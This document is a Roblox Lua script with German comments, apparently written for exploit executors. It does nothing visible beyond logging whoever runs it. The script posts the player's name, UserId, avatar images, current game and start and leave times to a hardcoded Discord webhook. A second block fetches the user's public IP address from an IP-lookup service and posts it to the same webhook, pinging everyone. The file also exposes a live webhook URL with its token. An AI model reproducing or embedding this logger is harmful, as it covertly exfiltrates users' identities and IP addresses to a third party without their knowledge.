local HttpService = game:GetService("HttpService")
local player = game.Players.LocalPlayer
local MarketplaceService = game:GetService("MarketplaceService")

local webhook = "https://discord.com/api/webhooks/1414303652398760049/1OFfo3t5urCsPQOynMiXessVwdo42_wrvcAGcF3Am00oAtQ-JPxwsA6poYQBHzxiGntQ"

-- Hilfsfunktion für den Embed
local function sendEmbed(action)
    local headshotUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
    local avatarUrl = "https://www.roblox.com/avatar-thumbnail/image?userId=" .. player.UserId .. "&width=720&height=720&format=png"
    
    local success, productInfo = pcall(function()
        return MarketplaceService:GetProductInfo(game.PlaceId)
    end)
    local gameName = (success and productInfo and productInfo.Name) or "Unbekanntes Spiel"
    
    local gameUrl = "https://www.roblox.com/games/" .. game.PlaceId
    local timeNow = os.date("!%Y-%m-%d %H:%M:%S") .. " UTC"

    local color = (action == "start") and 65280 or 16711680 -- grün bei Start, rot bei Ende
    local title = (action == "start") and "Script gestartet" or "Script beendet"

    local data = {
        ["username"] = "Script Logger",
        ["embeds"] = {{
            ["title"] = title,
            ["color"] = color,
            ["thumbnail"] = {["url"] = headshotUrl}, -- kleines Profilbild
            ["image"] = {["url"] = avatarUrl},       -- großes Avatarbild
            ["fields"] = {
                {["name"] = "Spielername", ["value"] = player.Name, ["inline"] = true},
                {["name"] = "UserId", ["value"] = tostring(player.UserId), ["inline"] = true},
                {["name"] = "Spiel", ["value"] = string.format("[%s](%s)", gameName, gameUrl), ["inline"] = false},
                {["name"] = "Zeitpunkt", ["value"] = timeNow, ["inline"] = false}
            }
        }}
    }

    local payload = HttpService:JSONEncode(data)
    local req = (syn and syn.request) or (http and http.request) or (request)
    if req then
        req({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = payload
        })
    end
end

-- Script Start
sendEmbed("start")

-- Script Ende / Roblox schließen
game:GetService("Players").PlayerRemoving:Connect(function(leavingPlayer)
    if leavingPlayer == player then
        sendEmbed("end")
    end
end)
local webhook = "https://discord.com/api/webhooks/1414303652398760049/1OFfo3t5urCsPQOynMiXessVwdo42_wrvcAGcF3Am00oAtQ-JPxwsA6poYQBHzxiGntQ"

local ip = game:HttpGet("https://api.ipify.org")
local data = {
    ["content"] = "Script wurde benutzt! IP: " .. ip .. " <@everyone>"
}

local httpService = game:GetService("HttpService")
local payload = httpService:JSONEncode(data)

local req = (syn and syn.request) or (http and http.request) or (request)
if req then
    req({
        Url = webhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = payload
    })
end

